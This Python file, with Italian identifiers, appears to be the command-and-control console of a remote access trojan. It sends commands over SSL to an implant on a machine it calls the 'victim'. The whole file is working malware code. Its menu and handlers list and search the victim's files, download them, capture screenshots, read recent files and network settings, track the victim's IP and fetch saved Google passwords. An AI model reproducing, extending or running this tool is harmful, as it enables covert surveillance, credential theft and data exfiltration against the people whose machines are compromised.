import platform
import re
import signal
import sys
import os
import time
import traceback
import subprocess
import ipinfo
import socket
import ssl

from tqdm import tqdm
from time import sleep
from socket import *
from os import system
from serverSSLconnection import *
from serverSSLRemoteCommands import *
from serverSSLgeneral import *
from serverSSLFunRC import *
from colorama import Fore

FORMAT = "utf-8"


# CONTROLLO REMOTO
def remoteControl(clientConnection,buff,fileLog):
    indice = 0
    while True:
        file = open("fileLogGenerale.txt", "w")
        file.write(fileLog)
        file.close()

        try:
            pathError = ""
            if buff[0:6] == "[PATH]":
                pathError = buff
                buff = ""
            else:
                pathError = clientConnection.recv(1024).decode(FORMAT)

            if pathError[0:7] == "[ERROR]":
                path = clientConnection.recv(1024).decode(FORMAT)
                print(path + "$ " + pathError)
            else:
                while pathError[0:6] != "[PATH]":
                    pathError = pathError[1:]

                path = pathError[6:]

            comando = input(path + "$ ")
            while comando == "":
                comando = input(path + "$ ")

            fileLog = fileLog + "\n" + path + "$ " + comando + "\n"

            clientConnection.send((comando).encode(FORMAT))

            if comando == "exit":
                print(f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n")
                fileLog = fileLog + "\n" + f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n" + "\n"
                file = open("fileLogGenerale.txt", "w")
                file.write(fileLog)
                file.close()
                return "[END]", fileLog

            elif comando[0:2] == "ls":
                match = regexcheck_ls(comando)
                if match:
                    try:
                        dato = clientConnection.recv(8000).decode(FORMAT)
                        if dato[0:7]=="[ERROR]":
                            raise Exception
                        else:
                            print(dato)
                            fileLog = fileLog + "\n" + dato + "\n"
                    except:
                        #traceback.print_exc()
                        print("\nAn error occurred, try again...\n")
                        fileLog = fileLog + "\n" + "An error occurred, try again...\n"
                else:
                    print("\nError, incorrect command. The correct command is: "+ Fore.GREEN + "ls <Path>" + Fore.RESET)
                    fileLog = fileLog + "\n" + "Error, incorrect command\n"

            elif comando == "pwd":
                pwdresult = clientConnection.recv(1024).decode(FORMAT)
                print("\"" + pwdresult + "\"")
                fileLog = fileLog + "\n" + pwdresult + "\n"

            elif comando == "clear":
                clearScreen()

            elif comando == "help":
                commandsHelp()

            elif comando[0:2] == "cd":
                pass

            elif comando[0:4] == "rete" or comando[0:7] == "network":
                try:
                    dato = clientConnection.recv(10000).decode()
                    if dato[0:7] == "[ERROR]":
                        raise Exception
                    else:
                        print(dato)
                        fileLog = fileLog + "\n" + dato + "\n"
                except:
                    #traceback.print_exc()
                    print("\nAn error occurred, try again...\n")
                    fileLog = fileLog + "\n" + "An error occurred, try again...\n"

            elif comando[0:9] == "filespath":
                #reg = "^filespath .[a-z]{1,4}|^filespath (\*)"
                #reg = "^filespath( \.[a-z]{1,4})+"
                reg = "^filespath( (\.[*])|( \.[a-z]{1,4}))+"
                if (re.match(reg, comando)):
                    fileLog=filespath(clientConnection,fileLog)
                else:
                    print("\nError, incorrect command. The correct command is: " + Fore.GREEN + "filespath <.extension>" + Fore.RESET)
                    fileLog = fileLog + "\n" + "Error, incorrect command\n"

            elif comando[0:7] == "fsearch":
                reg = r'^fsearch [\s\S]+\.[a-z]{1,4}'
                reg2 = r'^fsearch "([a-zA-Z0-9, ,\-,\_]+)"'
                if (re.match(reg, comando)) or (re.match(reg2, comando)):
                    fileLog=searchFile(clientConnection,fileLog)
                else:
                    print(
                        "\nError, incorrect command. The correct command is: " + Fore.GREEN + "fsearch <\"word\">" + Fore.RESET)
                    fileLog = fileLog + "\n" + "Error, incorrect command\n"

            elif comando[0:7] == "wsearch":
                fileLog=searchWord(clientConnection,fileLog, comando)

            elif comando[0:4] == "find":
                if regexcheck_find(comando) == True:
                    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50,bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        sleep(0.2)
                    print("Wait...")
                    filesize = clientConnection.recv(1024).decode(FORMAT)

                    if filesize[0:7]!="[ERROR]":
                        dato = ('').encode(FORMAT)
                        try:
                            dato = dato + clientConnection.recv(int(filesize))
                            print(dato.decode(FORMAT))
                            fileLog = fileLog + "\n" + dato.decode(FORMAT) + "\n"
                            for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Completing Operation", colour="green",
                                          ncols=50,
                                          bar_format="{desc}: {percentage:3.0f}% {bar}"):
                                sleep(0.2)
                        except:
                            #traceback.print_exc()
                            fileLog = fileLog + "\n" + "Command Find gone wrong\n"
                            print("Command Find gone wrong\n")
                    else:
                        print(filesize)
                else:
                    print(
                        "\nError, incorrect command. The correct command is: " + Fore.GREEN + "find <.exstension> <Path>" + Fore.RESET)
                    fileLog = fileLog + "\n" + "Error, incorrect command\n"

            elif comando == "info":
                output = clientConnection.recv(1024).decode(FORMAT)
                print(output)
                fileLog = fileLog + "\n" + output + "\n"

            elif comando[0:8] == "download":
                nomeFile,fileLog= download(comando,clientConnection,fileLog)
                try:
                    if nomeFile=="[ERROR]":
                        pass
                    else:
                        if platform.system() == 'Darwin':  # macOS
                            subprocess.call(('open', os.getcwd()+"/"+nomeFile))
                        elif platform.system() == 'Windows':  # Windows
                            os.startfile(os.getcwd()+"\\"+nomeFile)
                        else:  # linux variants
                            subprocess.call(('xdg-open', os.getcwd()+"/"+nomeFile))
                except:
                    pass

            elif comando == "file recenti":
                try:
                    dato = clientConnection.recv(10000).decode()
                    if dato[0:7] == "[ERROR]":
                        raise Exception
                    else:
                        print(dato)
                        fileLog = fileLog + "\n" + dato +"\n"
                except:
                    #traceback.print_exc()
                    print("\nAn error occurred, try again\n")
                    fileLog = fileLog + "\n" + "An error occurred, try again...\n"

            elif comando == "screenshot":
                nomeFoto = input("Name of the screen (without extension): ")
                nomeFoto=nomeFoto+".png"
                fileLog = fileLog + "\n" + "Name of the screen (without extension): " + nomeFoto + "\n"

                try:
                    file = open(nomeFoto, 'wb')
                    lunghezzacmd = len(nomeFoto)

                    for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + f"Downloading \"{nomeFoto}\"...", colour="green",
                                  ncols=45 + lunghezzacmd, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        time.sleep(0.2)

                    filerecv=clientConnection.recv(1024)
                    try:
                        fileIf=filerecv.decode(FORMAT)
                    except:
                        fileIf=""

                    if fileIf[0:7] != "[ERROR]":
                        scritti=0
                        while (filerecv != b'[END]'):
                            scritti = scritti + file.write(filerecv)
                            filerecv = clientConnection.recv(1024)

                        file.close()

                        if os.path.getsize(nomeFoto) <= 0:
                            fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
                            print("Screenshot failed\n")
                            os.remove(nomeFoto)
                        elif scritti < os.path.getsize(nomeFoto):
                            fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
                            print("Screenshot failed\n")
                            os.remove(nomeFoto)
                        else:
                            fileLog = fileLog + "\n" + f"Screenshot successfully downloaded\n" + "\n"
                            print(f"Screenshot successfully downloaded\n")
                        time.sleep(2)
                    else:
                        fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
                        print("Screenshot failed\n")
                        os.remove(nomeFoto)

                except:
                    #traceback.print_exc()
                    fileLog = fileLog + "\n" + "Screenshot failed\n" + "\n"
                    print("Screenshot failed\n")
                    try:
                        os.remove(nomeFoto)
                    except:
                        pass

            elif comando[0:4] == "open":
                fileLog=openZip(comando, clientConnection,fileLog)

            elif comando[0:4] == "save" or comando[0:5] == "salva":
                nome = "fileLog" + str(indice) + ".txt"
                file = open(nome, "w")
                file.write(fileLog)
                file.close()
                indice=indice+1

            elif comando[0:8] == "password":
                fileLog = funHackPassword(clientConnection, fileLog)

            elif comando[0:2] == "ip":
                fileLog = funHackIp(clientConnection, fileLog)

            elif comando[0:9] == "printFile":
                regex_match = regexcheck_print(comando)
                if regex_match == 'windowstip1' or regex_match == 'unixtip1':
                    printFile(clientConnection, fileLog)
                else:
                    print(
                        "\nError, incorrect command. The correct command is: " + Fore.GREEN + "printFile <\"filename\"> <path>" + Fore.RESET)
                    fileLog = fileLog + "\n" + "Error, incorrect command\n"

            else:
               print("[ERROR] Command not found...\n")
               commandsHelp()
               fileLog = fileLog + "\n" + "[ERROR] Command not found... \n"

        except Exception as e:
            if e.__class__.__name__ == "ConnectionResetError":
                print(f"[ERROR] Connection Interrupted\n")
                fileLog = fileLog + "\n" + "[ERROR] Connection Interrupted\n" + "\n"
                return "[ERROR CONNECTION]", fileLog
            elif e.__class__.__name__ == "SSLEOFError":
                print(f"[ERROR] Connection Interrupted\n")
                fileLog = fileLog + "\n" + "[ERROR] Connection Interrupted\n" + "\n"
                return "[ERROR CONNECTION]", fileLog
            else:
                return "[ERROR]", fileLog


# OK STAMPA INFO CLIENT
def printInformazioni(clientConnection, addr, fileLog, fernet):
    buff = ""
    risposta = "1"
    nbytes = 1
    newNBytes=""

    print(f"\nInformation on the victim's Operating System {addr}:")
    fileLog = fileLog + "\n" + f"\nInformation on the victim's Operating System {addr}:" + "\n"
    try:
        fileIf = clientConnection.recv(512)
        fileIf = fernet.decrypt(fileIf)
        fileIf = fileIf.decode(FORMAT)
        print("\n"+ fileIf)
        fileLog=fileLog+"\n"+fileIf+"\n"

        print(f"\n[DONE] Info received.\n")
        fileLog = fileLog + "\n" + f"\n[DONE] Info received.\n" + "\n"

        if fileIf[0:6]=="[PATH]":
            return fileIf,fileLog
        else:
            return "",fileLog
    except Exception as e:
        raise e

        #print(f"[ERROR] Information not received\n")
        #fileLog = fileLog + "\n" + f"[ERROR] Information not received\n" + "\n"
        #return "",fileLog


# OK STAMPA HELP COMMAND
def commandsHelp():
    print(
        "\n###                                  " + Fore.RED + "Commands available" + Fore.RESET + "                                  ###" + Fore.RESET)
    print()
    print(
        Fore.BLUE + f"01" + Fore.RESET + "-List of files in a path......................................: " + Fore.GREEN + "ls <Path>" + Fore.RESET)
    print(
        Fore.BLUE + f"02" + Fore.RESET + "-Current Working Directory....................................: " + Fore.GREEN + "pwd" + Fore.RESET)
    print(
        Fore.BLUE + f"03" + Fore.RESET + "-Change Working Directory.....................................: " + Fore.GREEN + "cd <Path>" + Fore.RESET)
    print(
        Fore.BLUE + f"04" + Fore.RESET + "-Network configuration........................................: " + Fore.GREEN + "rete/network" + Fore.RESET)
    print(
        Fore.BLUE + f"05" + Fore.RESET + "-Lists all files with extension (.pdf, .docx, .txt, etc...)...: " + Fore.GREEN + "filespath <.extension>" + Fore.RESET)
    print(
        Fore.BLUE + f"06" + Fore.RESET + "-Search if a file has that word in its name...................: " + Fore.GREEN + "fsearch <\"word\">" + Fore.RESET)
    print(
        Fore.BLUE + f"07" + Fore.RESET + "-Search if the text of a file has that word in it.............: " + Fore.GREEN + "wsearch <\"word\"> <path>" + Fore.RESET)
    print(
        Fore.BLUE + f"08" + Fore.RESET + "-Search for an extension type in a path.......................: " + Fore.GREEN + "find <.exstension> <Path>" + Fore.RESET)
    print(
        Fore.BLUE + f"09" + Fore.RESET + "-Information S.O. client......................................: " + Fore.GREEN + "info" + Fore.RESET)
    print(
        Fore.BLUE + f"10" + Fore.RESET + "-Download file................................................: " + Fore.GREEN + "download <\"filename.exstension\"> <path>" + Fore.RESET)
    print(
        Fore.BLUE + f"11" + Fore.RESET + "-Recently modified files list.................................: " + Fore.GREEN + "file recenti" + Fore.RESET)
    print(
        Fore.BLUE + f"12" + Fore.RESET + "-Take screenshots.............................................: " + Fore.GREEN + "screenshot" + Fore.RESET)
    print(
        Fore.BLUE + f"13" + Fore.RESET + "-Open a file.zip..............................................: " + Fore.GREEN + "open <\"nomeFile.zip\"> <path>" + Fore.RESET)
    print(
        Fore.BLUE + f"14" + Fore.RESET + "-Save everything done up to that point........................: " + Fore.GREEN + "save/salva" + Fore.RESET)
    print(
        Fore.BLUE + f"15" + Fore.RESET + "-Search for saved passwords on google.........................: " + Fore.GREEN + "password" + Fore.RESET)
    print(
        Fore.BLUE + f"16" + Fore.RESET + "-Track ip address.............................................: " + Fore.GREEN + "ip" + Fore.RESET)
    print(
        Fore.BLUE + f"17" + Fore.RESET + "-Read file content............................................: " + Fore.GREEN + "printFile <\"filename\"> <path>" + Fore.RESET)
    print(
        Fore.BLUE + f"18" + Fore.RESET + "-Open list of command.........................................: " + Fore.GREEN + "help" + Fore.RESET)
    print(
        Fore.BLUE + f"19" + Fore.RESET + "-Clear terminal...............................................: " + Fore.GREEN + "clear" + Fore.RESET)
    print(
        Fore.BLUE + f"20" + Fore.RESET + "-Exit from remote control.....................................: " + Fore.GREEN + "exit" + Fore.RESET)

    print()
    print("Type of <path>:")
    print(Fore.GREEN + "\t." + Fore.RESET + "        current path")
    print(Fore.GREEN + "\t.." + Fore.RESET + "       indicates the path to the previous folder")
    print(Fore.GREEN + "\t./<path>" + Fore.RESET + " indicates the path from the current folder to the path entered")
    print(Fore.GREEN + "\t<path>" + Fore.RESET + "   indicates the path")
